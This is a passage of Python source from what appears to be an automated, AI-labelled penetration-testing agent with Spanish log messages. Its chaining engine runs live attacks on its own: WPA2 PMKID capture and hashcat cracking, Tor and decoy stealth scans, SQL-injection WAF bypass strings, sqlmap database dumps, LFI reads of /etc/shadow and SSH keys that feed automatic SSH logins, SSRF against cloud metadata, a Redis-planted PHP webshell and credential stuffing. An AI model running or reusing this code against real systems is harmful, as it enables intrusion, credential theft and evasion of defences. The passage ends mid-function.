                    f"'{base_url}{mp}' 2>/dev/null",
                    target, timeout=10,
                )
                if mob_out.strip() in ("200", "201", "403"):
                    full_out, _ = self._run_cmd(
                        f"mobile-api-full-{mp.replace('/','_')[:15]}",
                        f"curl -sL --max-time 8 "
                        f"-H 'User-Agent: okhttp/4.9.0' "
                        f"-H 'X-Mobile-Token: null' "
                        f"'{base_url}{mp}' 2>/dev/null | head -20",
                        target, timeout=10,
                    )
                    if re.search(r'"id"|"token"|"user"|"device"', full_out):
                        self._save_findings([{
                            "title": f"Mobile API Endpoint Expuesto @ {base_url}{mp}",
                            "severity": "medium",
                            "description": f"Endpoint de API móvil accesible: {mp}\n{full_out[:300]}",
                            "cve": "",
                        }], target)

            # ── G3b: APK analysis (if downloadable or available) ──────────
            # Try to find APK download link
            apk_find, _ = self._run_cmd(
                "apk-find",
                f"curl -sL --max-time 10 '{base_url}/' 2>/dev/null | "
                f"grep -oP '[\"\\x27][^\"\\x27]+\\.apk[^\"\\x27]*' | tr -d '\"\\x27' | head -3; "
                f"curl -sL --max-time 8 '{base_url}/download' 2>/dev/null | "
                f"grep -oP 'https?://[^\"\\x27\\s]+\\.apk' | head -3",
                target, timeout=15,
            )
            apk_url_match = re.search(r'(https?://[^\s]+\.apk|/[^\s\"\']+\.apk)', apk_find)
            if apk_url_match:
                apk_url = apk_url_match.group(1)
                if not apk_url.startswith("http"):
                    apk_url = f"{base_url}{apk_url}"
                apk_analyze, _ = self._run_cmd(
                    "apk-analyze",
                    f"wget -q --timeout=30 '{apk_url}' -O /tmp/app_target.apk 2>/dev/null; "
                    f"apktool d /tmp/app_target.apk -o /tmp/app_decompile -f 2>/dev/null | tail -3; "
                    # Find hardcoded secrets
                    f"grep -rE '(?:api.?key|apikey|secret|password|token|aws.?access)[\"\\s]*[=:][\"\\s]*[\"\\x27][A-Za-z0-9_\\-\\.+/]{{16,}}' "
                    f"/tmp/app_decompile 2>/dev/null | grep -v '.class' | head -10; "
                    # Find IP addresses / URLs
                    f"grep -rE 'https?://[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' "
                    f"/tmp/app_decompile 2>/dev/null | grep -v '.class' | head -10; "
                    # Certificate pinning
                    f"grep -rE 'certificatePinner|TrustManager|X509TrustManager|checkServerTrusted' "
                    f"/tmp/app_decompile/smali 2>/dev/null | head -5",
                    target, timeout=120,
                )
                secrets_found = re.findall(
                    r'(?:api.?key|secret|token|password|aws)[^\n]*=[^\n]{10,}',
                    apk_analyze, re.IGNORECASE
                )
                if secrets_found:
                    self._save_findings([{
                        "title": f"Hardcoded Secrets in APK — {apk_url}",
                        "severity": "high",
                        "description": f"Secrets encontrados en APK decompilado:\n" + "\n".join(f"• {s[:80]}" for s in secrets_found[:5]),
                        "cve": "",
                    }], target)

    # ── G4: Wireless audit (WPA2 PMKID, passive) ──────────────────────────
    def _wireless_audit(self, target, accumulated_output):
        """WPA2 PMKID capture, WPS check, rogue AP detection (remote/passive only)."""
        self._log(f"[Claude] G4-WIRELESS: Wireless audit (passive) → {target}")
        # Check if we have wireless interface
        wifi_check, _ = self._run_cmd(
            "wifi-interface",
            "iw dev 2>/dev/null | grep Interface | head -3; "
            "iwconfig 2>/dev/null | grep 'IEEE 802.11' | head -3; "
            "ls /sys/class/net/ 2>/dev/null | grep -E '^wl|^ath|^wlan' | head -3",
            target, timeout=10,
        )
        wifi_iface = re.search(r'(wlan\d+|wlp\w+|ath\d+)', wifi_check)
        if not wifi_iface:
            self._log(f"[Claude] G4: Sin interfaz wireless — saltando")
            return

        iface = wifi_iface.group(1)
        self._log(f"[Claude] G4: Interfaz wireless {iface} detectada")

        # ── G4a: WPA2 PMKID attack (hcxdumptool) ─────────────────────────
        pmkid_out, _ = self._run_cmd(
            "wpa2-pmkid",
            f"hcxdumptool -i {iface} --enable_status=3 "
            f"-o /tmp/pmkid_capture.pcapng --filtermode=2 "
            f"--timeout=60 2>/dev/null | head -10; "
            f"hcxpcapngtool /tmp/pmkid_capture.pcapng "
            f"-o /tmp/pmkid_hashes.txt 2>/dev/null | head -5; "
            f"cat /tmp/pmkid_hashes.txt 2>/dev/null | head -5",
            target, timeout=90,
        )
        if re.search(r'PMKID|hash|WPA\*01\*', pmkid_out, re.IGNORECASE):
            # Crack PMKID
            pmkid_crack, _ = self._run_cmd(
                "pmkid-crack",
                f"hashcat -a 0 -m 22000 --force --quiet "
                f"/tmp/pmkid_hashes.txt "
                f"/usr/share/wordlists/rockyou.txt 2>/dev/null | tail -5; "
                f"hashcat -m 22000 --show /tmp/pmkid_hashes.txt 2>/dev/null | head -5",
                target, timeout=300,
            )
            if re.search(r'WPA\*01\*.*:', pmkid_crack):
                cracked = re.findall(r'WPA\*01\*[a-f0-9\*]+:(\S+)', pmkid_crack)
                self._save_findings([{
                    "title": f"WPA2 PMKID Crackeado — WiFi Password Obtenido",
                    "severity": "critical",
                    "description": f"WPA2 password crackeado via PMKID:\n{pmkid_crack[:300]}",
                    "cve": "",
                }], target)
            else:
                self._save_findings([{
                    "title": f"WPA2 PMKID Capturado — Pendiente de Cracking",
                    "severity": "high",
                    "description": f"PMKID capturado para cracking offline.\n{pmkid_out[:200]}",
                    "cve": "",
                }], target)

    # ── G5: Supply chain / dependency confusion ────────────────────────────
    def _supply_chain_check(self, target, open_ports, accumulated_output):
        """Package manifest exposure, dependency confusion, typosquatting detection."""
        self._log(f"[Claude] G5-SUPPLYCHAIN: Supply chain attack surface → {target}")
        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443, 3000)]
        if not http_ports:
            return

        for p in http_ports[:1]:
            proto = "https" if p["port"] in (443, 8443) else "http"
            base_url = f"{proto}://{target}:{p['port']}"

            # ── G5a: Exposed package manifests ────────────────────────────
            manifest_paths = [
                "/package.json", "/package-lock.json", "/yarn.lock",
                "/requirements.txt", "/Pipfile", "/Pipfile.lock",
                "/pom.xml", "/build.gradle", "/go.mod", "/go.sum",
                "/Gemfile", "/Gemfile.lock", "/composer.json",
                "/composer.lock", "/.npmrc", "/.pypirc",
            ]
            found_manifests = []
            for mp in manifest_paths:
                mani_out, _ = self._run_cmd(
                    f"manifest-{mp.replace('/','_').replace('.','_')[:20]}",
                    f"curl -sL --max-time 6 -o /dev/null -w '%{{http_code}} %{{size_download}}' "
                    f"'{base_url}{mp}' 2>/dev/null",
                    target, timeout=8,
                )
                code_size = re.search(r'^(\d{3}) (\d+)', mani_out)
                if code_size and code_size.group(1) == "200" and int(code_size.group(2)) > 20:
                    # Fetch and parse
                    mani_content, _ = self._run_cmd(
                        f"manifest-content-{mp.replace('/','_')[:15]}",
                        f"curl -sL --max-time 8 '{base_url}{mp}' 2>/dev/null | head -30",
                        target, timeout=10,
                    )
                    found_manifests.append((mp, mani_content[:200]))
                    # Check for internal package names (dependency confusion)
                    if mp in ("/package.json", "/package-lock.json"):
                        internal_pkgs = re.findall(r'"name":\s*"(@[a-z0-9\-]+/[a-z0-9\-]+|[a-z0-9\-]+)"', mani_content)
                        for pkg in internal_pkgs[:10]:
                            # Check if name exists on npmjs.com (if not → dependency confusion possible)
                            npm_check, _ = self._run_cmd(
                                f"npm-check-{pkg[:20].replace('@','').replace('/','_')}",
                                f"curl -sL --max-time 6 -o /dev/null -w '%{{http_code}}' "
                                f"'https://registry.npmjs.org/{pkg}' 2>/dev/null",
                                target, timeout=8,
                            )
                            if npm_check.strip() == "404":
                                self._save_findings([{
                                    "title": f"Dependency Confusion Risk: '{pkg}' no existe en npm",
                                    "severity": "high",
                                    "description": f"Paquete interno '{pkg}' expuesto en {mp} no existe en npm → dependency confusion attack posible.\n"
                                                   f"Un atacante puede publicar '{pkg}' en npm con código malicioso.",
                                    "cve": "",
                                }], target)
            if found_manifests:
                self._save_findings([{
                    "title": f"Package Manifests Expuestos @ {base_url}",
                    "severity": "medium",
                    "description": "Archivos de dependencias expuestos públicamente:\n" +
                                   "\n".join(f"• {mp}" for mp, _ in found_manifests),
                    "cve": "",
                }], target)

            # ── G5b: .npmrc / .pypirc with auth tokens ────────────────────
            for rc_path in ["/.npmrc", "/.pypirc", "/.pip/pip.conf", "/pip.conf"]:
                rc_out, _ = self._run_cmd(
                    f"rc-file-{rc_path.replace('/','_').replace('.','_')[:15]}",
                    f"curl -sL --max-time 6 '{base_url}{rc_path}' 2>/dev/null | head -10",
                    target, timeout=8,
                )
                if re.search(r'authToken|_auth|password|token|registry.*http', rc_out, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"NPM/PyPI Auth Token Expuesto @ {base_url}{rc_path}",
                        "severity": "critical",
                        "description": f"Archivo de configuración con credenciales de registry expuesto.\n{rc_out[:300]}",
                        "cve": "",
                    }], target)

    # ═════════════════════════════════════════════════════════════════════════
    # TIER 3 — Commercial product features
    # ═════════════════════════════════════════════════════════════════════════

    # ── H2: CI/CD integration (SARIF, webhooks, Jira) ─────────────────────
    # (H1 multi-tenant is Flask routes — added separately below)

    # ── H3: Compliance mapping (OWASP, PCI-DSS, ISO 27001, NIST) ─────────
    _COMPLIANCE_MAP = {
        # (regex_pattern, [frameworks_and_controls])
        r'sql.inject|sqli|sqlmap':
            [("OWASP Top 10", "A03:2021 Injection"),
             ("PCI-DSS 4.0", "Req 6.2.4 — Software Security"),
             ("ISO 27001", "A.14.2.5 — Secure Development"),
             ("NIST CSF", "PR.IP-1")],
        r'xss|cross.site.script':
            [("OWASP Top 10", "A03:2021 Injection"),
             ("PCI-DSS 4.0", "Req 6.2.4"),
             ("ISO 27001", "A.14.1.2")],
        r'ms17.010|eternalblue|smb.*vuln':
            [("NIST CSF", "ID.RA-1 — Vulnerability Assessment"),
             ("PCI-DSS 4.0", "Req 6.3.3 — Patch Management"),
             ("ISO 27001", "A.12.6.1 — Technical Vulnerability Management")],
        r'default.*cred|weak.*password|brute':
            [("OWASP Top 10", "A07:2021 — Identification & Authentication Failures"),
             ("PCI-DSS 4.0", "Req 8.3 — Password Requirements"),
             ("ISO 27001", "A.9.4.3 — Password Management")],
        r's3.*public|bucket.*exposed|cloud.*misconfigur':
            [("OWASP Top 10", "A05:2021 — Security Misconfiguration"),
             ("PCI-DSS 4.0", "Req 1.3 — Network Access Controls"),
             ("NIST CSF", "PR.AC-3")],
        r'ssl.*tls|heartbleed|poodle|beast|weak.*cipher':
            [("PCI-DSS 4.0", "Req 4.2.1 — Strong Cryptography"),
             ("ISO 27001", "A.10.1.1 — Cryptographic Controls"),
             ("NIST CSF", "PR.DS-2")],
        r'docker.*api|container.*escape|k8s|kubernetes':
            [("NIST CSF", "PR.IP-1 — Baseline Configuration"),
             ("ISO 27001", "A.12.1.4 — Separation of Development"),
             ("OWASP Top 10", "A05:2021 — Security Misconfiguration")],
        r'ssrf|server.side.request':
            [("OWASP Top 10", "A10:2021 — SSRF"),
             ("PCI-DSS 4.0", "Req 6.2.4")],
        r'lfi|local.file.include|path.traversal':
            [("OWASP Top 10", "A01:2021 — Broken Access Control"),
             ("PCI-DSS 4.0", "Req 6.2.4")],
        r'privesc|privilege.escal|root|uid=0':
            [("NIST CSF", "PR.AC-4 — Access Permissions"),
             ("ISO 27001", "A.9.2.3 — Management of Privileged Access"),
             ("PCI-DSS 4.0", "Req 7 — Restrict Access")],
        r'jwt|token.*bypass|auth.*bypass':
            [("OWASP Top 10", "A07:2021 — Authentication Failures"),
             ("PCI-DSS 4.0", "Req 8.6 — System/Application Accounts")],
        r'smtp.*spoof|spf.*missing|dmarc.*missing':
            [("NIST CSF", "PR.AT-1"),
             ("ISO 27001", "A.13.2.3 — Electronic Messaging")],
    }

    def _auto_compliance_tag(self, finding):
        """Auto-tag findings with compliance framework controls."""
        if finding.get("compliance"):
            return finding
        text = f"{finding.get('title', '')} {finding.get('description', '')}".lower()
        matched = []
        for pattern, controls in self._COMPLIANCE_MAP.items():
            if re.search(pattern, text, re.IGNORECASE):
                for framework, control in controls:
                    matched.append(f"{framework}: {control}")
        if matched:
            finding["compliance"] = matched
        return finding

    # ── H4: Continuous monitoring / CVE feed integration ──────────────────
    def _cve_feed_check(self, target, open_ports, accumulated_output):
        """Check NVD/OSV CVE feed for versions detected in this scan."""
        self._log(f"[Claude] H4-CVE-FEED: Checking CVE feeds for detected versions → {target}")
        combined = "\n".join(accumulated_output[-30:])
        # Extract version strings
        versions_found = re.findall(
            r'((?:apache|nginx|openssh|openssl|php|tomcat|wordpress|drupal|joomla|'
            r'iis|vsftpd|proftpd|mysql|mariadb|postgresql|redis|elasticsearch|'
            r'jenkins|gitlab|jira|confluence|exchange|smb)[^\s/]*\s*[\d]+\.[\d]+(?:\.[\d]+)?)',
            combined, re.IGNORECASE
        )
        if not versions_found:
            return

        for version_str in versions_found[:5]:
            # Query NVD API (free, no key for basic)
            product = re.match(r'([a-zA-Z\-]+)', version_str)
            ver_num = re.search(r'([\d]+\.[\d]+(?:\.[\d]+)?)', version_str)
            if not product or not ver_num:
                continue
            prod_name = product.group(1).lower()
            ver = ver_num.group(1)
            nvd_out, _ = self._run_cmd(
                f"nvd-cve-{prod_name[:15]}-{ver.replace('.','_')}",
                f"curl -sL --max-time 10 "
                f"'https://services.nvd.nist.gov/rest/json/cves/2.0"
                f"?keywordSearch={prod_name}+{ver}&resultsPerPage=5' 2>/dev/null | "
                f"python3 -c '"
                f"import sys,json; d=json.load(sys.stdin); "
                f"vulns=d.get(\"vulnerabilities\",[])[:3]; "
                f"[print(f\"CVE: {{v[chr(99)+chr(118)+chr(101)][chr(105)+chr(100)]}} "
                f"CVSS={{v[chr(99)+chr(118)+chr(101)].get(chr(109)+chr(101)+chr(116)+chr(114)+chr(105)+chr(99)+chr(115),{{}}).get(chr(99)+chr(118)+chr(115)+chr(115)+chr(77)+chr(101)+chr(116)+chr(114)+chr(105)+chr(99)+chr(68)+chr(97)+chr(116)+chr(97),{{}}).get(chr(98)+chr(97)+chr(115)+chr(101)+chr(83)+chr(99)+chr(111)+chr(114)+chr(101),chr(63))}}\") "
                f"for v in vulns]' 2>/dev/null | head -10; "
                # Also check OSV (open source vuln db)
                f"curl -sL --max-time 8 -X POST "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"package\":{{\"name\":\"{prod_name}\",\"ecosystem\":\"PyPI\"}},"
                f"\"version\":\"{ver}\"}}' "
                f"'https://api.osv.dev/v1/query' 2>/dev/null | "
                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
                f"vulns=d.get(\"vulns\",[])[:3]; "
                f"[print(f\"OSV: {{v.get(chr(105)+chr(100))}} SEVERITY={{v.get(chr(100)+chr(98)+chr(95)+chr(115)+chr(112)+chr(101)+chr(99)+chr(105)+chr(102)+chr(105)+chr(99)+chr(115),{{}}).get(chr(115)+chr(101)+chr(118)+chr(101)+chr(114)+chr(105)+chr(116)+chr(121))}}\") "
                f"for v in vulns]' 2>/dev/null | head -5",
                target, timeout=20,
            )
            cve_hits = re.findall(r'CVE-\d{4}-\d+.*?(?:CVSS|SEVERITY).*?(\d+\.?\d*)', nvd_out)
            osv_hits = re.findall(r'OSV: (\S+)', nvd_out)
            if cve_hits or osv_hits:
                self._save_findings([{
                    "title": f"CVE Feed: Vulnerabilidades Conocidas para {version_str}",
                    "severity": "high",
                    "description": f"CVEs encontrados para {version_str} via NVD/OSV:\n{nvd_out[:400]}",
                    "cve": cve_hits[0].split()[0] if cve_hits else "",
                }], target)
                accumulated_output.append(f"=== CVE Feed {version_str} ===\n{nvd_out[:300]}")

    # ── H5: Stealth mode — timing, Tor, fragmented scans ──────────────────
    def _stealth_recon(self, target, open_ports, accumulated_output):
        """Stealth scan: random timing, Tor proxy, fragmented packets, decoys."""
        if not getattr(self, "stealth_mode", False):
            return
        self._log(f"[Claude] H5-STEALTH: Stealth reconnaissance → {target}")

        # ── H5a: Tor-proxied scan ─────────────────────────────────────────
        tor_check, _ = self._run_cmd(
            "tor-check",
            "curl -sL --max-time 5 --socks5-hostname 127.0.0.1:9050 "
            "'https://check.torproject.org/api/ip' 2>/dev/null | head -3",
            target, timeout=10,
        )
        tor_available = '"IsTor":true' in tor_check or "IsTor" in tor_check

        if tor_available:
            self._log(f"[Claude] H5: Tor disponible → escaneando via Tor")
            tor_scan, _ = self._run_cmd(
                "stealth-tor-scan",
                f"proxychains4 -q nmap -sT -Pn -T2 --open "
                f"-p 80,443,8080,8443,22 {target} 2>/dev/null | head -20",
                target, timeout=120,
            )
            accumulated_output.append(f"=== Stealth Tor Scan ===\n{tor_scan[:300]}")

        # ── H5b: Fragmented + decoy scan ─────────────────────────────────
        stealth_scan, _ = self._run_cmd(
            "stealth-frag-scan",
            f"nmap -sS -f --mtu 8 -T1 --randomize-hosts "
            f"--data-length 20 -D RND:5 "
            f"-p {','.join(str(p['port']) for p in open_ports[:10])} "
            f"{target} 2>/dev/null | head -20",
            target, timeout=120,
        )
        if stealth_scan.strip():
            accumulated_output.append(f"=== Stealth Frag Scan {target} ===\n{stealth_scan[:300]}")

        # ── H5c: WAF detection + bypass ───────────────────────────────────
        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443)]
        for hp in http_ports[:1]:
            proto = "https" if hp["port"] in (443, 8443) else "http"
            base_url = f"{proto}://{target}:{hp['port']}"
            waf_out, _ = self._run_cmd(
                "waf-detect",
                f"wafw00f '{base_url}' 2>/dev/null | head -10; "
                f"nmap -p {hp['port']} --script http-waf-detect,http-waf-fingerprint "
                f"{target} 2>/dev/null | head -15",
                target, timeout=30,
            )
            waf_detected = re.search(r'WAF|Cloudflare|Imperva|F5|Barracuda|ModSecurity|Akamai', waf_out, re.IGNORECASE)
            if waf_detected:
                waf_name = waf_detected.group()
                self._save_findings([{
                    "title": f"WAF Detectado: {waf_name} @ {base_url}",
                    "severity": "info",
                    "description": f"Web Application Firewall activo: {waf_name}.\n{waf_out[:200]}",
                    "cve": "",
                }], target)
                # Try bypass techniques
                bypass_out, _ = self._run_cmd(
                    "waf-bypass",
                    f"nuclei -u '{base_url}' -t /root/nuclei-templates/fuzzing/waf-bypass/ "
                    f"-silent 2>/dev/null | head -10; "
                    # HPP bypass
                    f"curl -sL --max-time 8 "
                    f"'{base_url}/?id=1%27%20OR%20%271%27%3D%271&id=1' 2>/dev/null | head -3; "
                    # Case variation
                    f"curl -sL --max-time 8 "
                    f"'{base_url}/?id=1+UnIoN+SeLeCt+1,2,3--' 2>/dev/null | head -3",
                    target, timeout=30,
                )
                if re.search(r'bypass.*success|WAF.*bypass|200.*SQL', bypass_out, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"WAF Bypass Exitoso — {waf_name} @ {base_url}",
                        "severity": "high",
                        "description": f"WAF {waf_name} bypasseado.\n{bypass_out[:300]}",
                        "cve": "",
                    }], target)

    # ══════════════════════════════════════════════════════════════════════════
    # C1 — Vulnerability Chaining Engine
    # ══════════════════════════════════════════════════════════════════════════
    _CHAIN_RULES = [
        {"trigger": r"sql.inject|sqli|sqlmap|sql.*error",       "actions": ["extract_db_creds"]},
        {"trigger": r"lfi|local.*file.*inclus|path.*traversal", "actions": ["lfi_sensitive_files"]},
        {"trigger": r"ssrf",                                    "actions": ["ssrf_cloud_metadata"]},
        {"trigger": r"stored.xss|xss.*stored|persistent.*xss", "actions": ["xss_cookie_steal"]},
        {"trigger": r"ftp.*anon|anonymous.*ftp",                "actions": ["ftp_data_exfil"]},
        {"trigger": r"redis.*no.?auth|redis.*unauth",           "actions": ["redis_chain_rce"]},
        {"trigger": r"valid.*cred|cred.*found|hydra.*login|login.*success", "actions": ["cred_stuff_all"]},
        {"trigger": r"rce|remote.*code.*exec|command.*inject|webshell", "actions": ["rce_post_exploit"]},
    ]

    def _vuln_chain_engine(self, target, open_ports, accumulated_output):
        """C1: Auto-chain detected vulns into deeper exploits."""
        self._log(f"[C1-CHAIN] Analizando cadenas de explotación para {target}")
        combined = "\n".join(accumulated_output[-30:])
        project = read_project(self.project_id)
        if not project:
            return
        findings = project.get("findings", [])

        for rule in self._CHAIN_RULES:
            pattern = rule["trigger"]
            # Match against any finding title/desc or raw output
            matched = any(
                re.search(pattern, f"{f.get('title','')} {f.get('description','')}".lower(), re.IGNORECASE)
                for f in findings
            ) or re.search(pattern, combined, re.IGNORECASE)
            if not matched:
                continue

            for action in rule["actions"]:

                if action == "extract_db_creds":
                    self._log(f"[C1-CHAIN] SQLi found → dumping DB credentials")
                    endpoints = re.findall(r'https?://[^\s"\'>]+(?:\.php|\.asp|\.jsp|do\b|\?[^\s"\']+)', combined)
                    for ep in endpoints[:4]:
                        out, _ = self._run_cmd("chain-sqli-dump",
                            f"sqlmap -u '{ep}' --batch --dump-all --level=1 --risk=1 "
                            f"--output-dir=/tmp/sqlmap_chain_{target.replace('.','_')} 2>/dev/null | tail -60",
                            target, timeout=180)
                        accumulated_output.append(f"=== CHAIN SQLi Dump: {ep[:60]} ===\n{out[:1500]}")
                        for usr, pwd in re.findall(r'(\S[\w\.\-@]+)\s*\|\s*(\S.{2,40})', out):
                            pwd_clean = pwd.strip()
                            if len(pwd_clean) < 60:
                                MEMORY.remember_cred(target, "db", usr, pwd_clean)
                                self._log(f"[C1-CHAIN] DB cred found: {usr}")
                        # Auto-use found creds
                        db_users = re.findall(r'login:\s*(\w+)\s+password:\s*(\S+)', out)
                        if db_users:
                            self._vuln_chain_engine_use_creds(target, open_ports, db_users, accumulated_output)

                elif action == "lfi_sensitive_files":
                    self._log(f"[C1-CHAIN] LFI found → reading sensitive files")
                    lfi_payloads = [
                        "/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa",
                        "/home/www-data/.ssh/id_rsa", "../../../../etc/passwd",
                        "/proc/self/environ", "/var/log/auth.log", "/root/.bash_history",
                        "../../../../windows/system32/drivers/etc/hosts",
                        "C:/Windows/System32/drivers/etc/hosts",
                    ]
                    endpoints = re.findall(r'https?://[^\s"\'<>]+', combined)
                    for ep in endpoints[:3]:
                        params = re.findall(r'[?&](\w+)=', ep) or ["file", "page", "path", "include", "load"]
                        for param in params[:3]:
                            for lfi_p in lfi_payloads[:5]:
                                base_ep = re.sub(rf'([?&]{param})=[^&]*', rf'\1={lfi_p}', ep)
                                if param not in ep:
                                    sep = "&" if "?" in ep else "?"
                                    base_ep = f"{ep}{sep}{param}={lfi_p}"
                                out, _ = self._run_cmd("chain-lfi-read",
                                    f"curl -sk '{base_ep}' -L --max-redirs 3 2>/dev/null | head -30",
                                    target, timeout=12)
                                if re.search(r'root:.*:/bin/|BEGIN.*PRIVATE KEY|daemon:', out):
                                    self._save_findings([{
                                        "title": f"LFI → Sensitive File Read: {lfi_p}",
                                        "severity": "critical",
                                        "description": f"LFI chain on {ep} param={param} read {lfi_p}",
                                        "evidence": out[:400],
                                    }], target)
                                    accumulated_output.append(f"=== CHAIN LFI {lfi_p} ===\n{out[:600]}")
                                    if "BEGIN" in out and "PRIVATE KEY" in out:
                                        key_file = f"/tmp/lfi_key_{target.replace('.','_')}.pem"
                                        try:
                                            with open(key_file, 'w') as kf:
                                                kf.write(out)
                                            os.chmod(key_file, 0o600)
                                            for ssh_user in ["root", "www-data", "ubuntu", "admin", "user"]:
                                                ssh_out, _ = self._run_cmd("chain-lfi-ssh",
                                                    f"ssh -i {key_file} -o StrictHostKeyChecking=no "
                                                    f"-o ConnectTimeout=8 {ssh_user}@{target} "
                                                    f"'id; hostname; cat /root/root.txt 2>/dev/null' 2>/dev/null",
                                                    target, timeout=18)
                                                if "uid=" in ssh_out:
                                                    self._save_findings([{
                                                        "title": f"LFI → SSH Key → RCE as {ssh_user}",
                                                        "severity": "critical",
                                                        "description": f"Full chain: LFI read SSH private key → SSH login as {ssh_user}: {ssh_out[:300]}",
                                                    }], target)
                                                    break
                                        except Exception:
                                            pass

                elif action == "ssrf_cloud_metadata":
                    self._log(f"[C1-CHAIN] SSRF found → testing cloud metadata exfiltration")
                    ssrf_targets = [
                        ("AWS_v1", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
                        ("AWS_v2", "http://169.254.169.254/latest/meta-data/"),
                        ("GCP",    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
                        ("Azure",  "http://169.254.169.254/metadata/instance?api-version=2021-01-01"),
                    ]
                    endpoints = re.findall(r'https?://[^\s"\'<>]{10,120}', combined)
                    for ep in endpoints[:3]:
                        for ssrf_name, ssrf_url in ssrf_targets:
                            for param in ["url", "redirect", "fetch", "proxy", "target", "dest"]:
                                sep = "&" if "?" in ep else "?"
                                test = f"{ep}{sep}{param}={ssrf_url}"
                                out, _ = self._run_cmd("chain-ssrf-cloud",
                                    f"curl -sk '{test}' -L --max-redirs 2 2>/dev/null | head -20",
                                    target, timeout=10)
                                if re.search(r'accessKeyId|access_token|secretAccessKey|computeMetadata|iamprofile', out, re.IGNORECASE):
                                    self._save_findings([{
                                        "title": f"SSRF → {ssrf_name} Cloud Metadata Access (Chain)",
                                        "severity": "critical",
                                        "description": f"SSRF chain on {ep} dumped cloud metadata via param={param}",
                                        "evidence": out[:500],
                                    }], target)
                                    accumulated_output.append(f"=== CHAIN SSRF→{ssrf_name} ===\n{out[:500]}")

                elif action == "ftp_data_exfil":
                    self._log(f"[C1-CHAIN] FTP anon found → exfiltrating sensitive files")
                    out, _ = self._run_cmd("chain-ftp-exfil",
                        f"ftp -n {target} <<'FTPEOF'\nuser anonymous anonymous\nbinary\nls -la\nget /etc/passwd /tmp/ftp_passwd_{target.replace('.','_')}\nget /home/ /tmp/ftp_home_{target.replace('.','_')}\nbye\nFTPEOF",
                        target, timeout=30)
                    accumulated_output.append(f"=== CHAIN FTP Exfil ===\n{out[:500]}")
                    # Check for retrieved passwd file
                    passwd_path = f"/tmp/ftp_passwd_{target.replace('.','_')}"
                    if os.path.exists(passwd_path):
                        with open(passwd_path) as pf:
                            content = pf.read()
                        if "root:" in content:
                            self._save_findings([{
                                "title": "FTP Anonymous → /etc/passwd Exfiltrated (Chain)",
                                "severity": "critical",
                                "description": f"FTP anonymous login chain read /etc/passwd: {content[:300]}",
                            }], target)

                elif action == "redis_chain_rce":
                    self._log(f"[C1-CHAIN] Redis no-auth → attempting webshell/cron RCE chain")
                    out, _ = self._run_cmd("chain-redis-rce",
                        f"redis-cli -h {target} config set dir /var/www/html && "
                        f"redis-cli -h {target} config set dbfilename shell.php && "
                        f"redis-cli -h {target} set pwn '<?php system($_GET[\"cmd\"]);?>' && "
                        f"redis-cli -h {target} save && echo REDIS_WEBSHELL_OK",
                        target, timeout=20)
                    if "REDIS_WEBSHELL_OK" in out:
                        self._save_findings([{
                            "title": "Redis No-Auth → Webshell via CONFIG (Chain)",
                            "severity": "critical",
                            "description": "Redis config set wrote PHP webshell to /var/www/html/shell.php",
                        }], target)
                        # Test the webshell
                        ws_out, _ = self._run_cmd("chain-redis-webshell",
                            f"curl -sk 'http://{target}/shell.php?cmd=id' 2>/dev/null",
                            target, timeout=10)
                        if "uid=" in ws_out:
                            self._save_findings([{
                                "title": "Redis Chain → Webshell RCE Confirmed",
                                "severity": "critical",
                                "description": f"RCE via Redis webshell: {ws_out[:200]}",
                            }], target)

                elif action == "cred_stuff_all":
                    self._log(f"[C1-CHAIN] Credentials found → stuffing all open services")
                    all_verified = MEMORY.get_all_verified_creds()
                    also_raw = re.findall(
                        r'(?:login|user(?:name)?)\s*[=:]\s*(\w+)[;\s]+(?:password|pass)\s*[=:]\s*(\S+)',
                        combined, re.IGNORECASE
                    )
                    pairs = [(c["username"], c["password"]) for c in all_verified]
                    pairs += [(u, p) for u, p in also_raw if len(p) < 50]
                    self._vuln_chain_engine_use_creds(target, open_ports, pairs[:8], accumulated_output)

                elif action == "rce_post_exploit":
                    self._log(f"[C1-CHAIN] RCE found → auto post-exploitation chain")
                    # Find the webshell URL or SSH connection from output
                    ws_urls = re.findall(r'https?://[^\s"\']+(?:shell|cmd|exec)\.php\S*', combined)
                    for ws_url in ws_urls[:2]:
                        for cmd in ["id", "whoami", "hostname", "uname -a", "cat /etc/passwd",
                                    "cat /root/root.txt 2>/dev/null", "cat ~/user.txt 2>/dev/null"]:
                            rce_out, _ = self._run_cmd("chain-rce-cmd",
                                f"curl -sk '{ws_url}?cmd={cmd.replace(' ','+')}' 2>/dev/null",
                                target, timeout=10)
                            if rce_out.strip():
                                accumulated_output.append(f"=== CHAIN RCE {cmd} ===\n{rce_out[:300]}")

    def _vuln_chain_engine_use_creds(self, target, open_ports, cred_pairs, accumulated_output):
        """Helper: try (user, pass) pairs on all open services."""
        port_set = {p["port"] for p in open_ports}
        for cred in cred_pairs[:6]:
            u, pw = (cred if isinstance(cred, tuple) else (cred, ""))
            if not pw:
                continue
            # SSH
            if 22 in port_set:
                out, _ = self._run_cmd("chain-cred-ssh",
                    f"sshpass -p '{pw}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 "
                    f"{u}@{target} 'id; hostname; cat /root/root.txt 2>/dev/null' 2>/dev/null",
                    target, timeout=18)
                if "uid=" in out:
                    MEMORY.remember_cred(target, "ssh", u, pw, verified=True)
                    self._save_findings([{
                        "title": f"Credential Chain → SSH Login: {u}",
                        "severity": "critical",
                        "description": f"Credentials {u}:*** worked on SSH: {out[:200]}",
                    }], target)
                    accumulated_output.append(f"=== CHAIN CRED SSH {u}@{target} ===\n{out[:400]}")
            # FTP
            if 21 in port_set:
                out, _ = self._run_cmd("chain-cred-ftp",
                    f"curl -sk --user '{u}:{pw}' ftp://{target}/ 2>/dev/null | head -10",
                    target, timeout=12)
                if out.strip() and "failed" not in out.lower():
                    MEMORY.remember_cred(target, "ftp", u, pw, verified=True)
                    self._save_findings([{
                        "title": f"Credential Chain → FTP Login: {u}",
                        "severity": "high",
                        "description": f"FTP login with chained credentials {u}",
                    }], target)
            # SMB
            if 445 in port_set:
                out, _ = self._run_cmd("chain-cred-smb",
